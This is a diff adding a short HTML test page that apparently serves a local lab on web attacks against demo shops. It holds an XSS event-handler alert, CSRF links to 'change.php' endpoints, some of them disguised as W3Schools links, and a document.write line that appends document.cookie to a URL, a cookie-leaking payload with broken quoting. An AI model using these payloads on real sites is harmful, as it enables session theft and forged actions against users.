@@ -1,0 +1,8 @@
+<b onmouseover=alert("Wufff!")>click me!</b>
+
+<a href="http://localhost/dashboard/protectedshopTest/change.php">Visit W3Schools.com!</a>
+<a href="http://localhost/dashboard/hackerattackcsrf/change.php">Csrf attack!</a>
+
+<script>"<a href="http://localhost/dashboard/unprotectedshopCSRFattack/change.php">Visit W3Schools.com!</a>"</script>
+<script>document.write(‘<base href=“http://localhost/dashboard/unprotectedshop/change.php?' + document.cookie + ‘ “/>’);</script>
+<a href="https://www.w3schools.com">Visit W3Schools.com!</a>
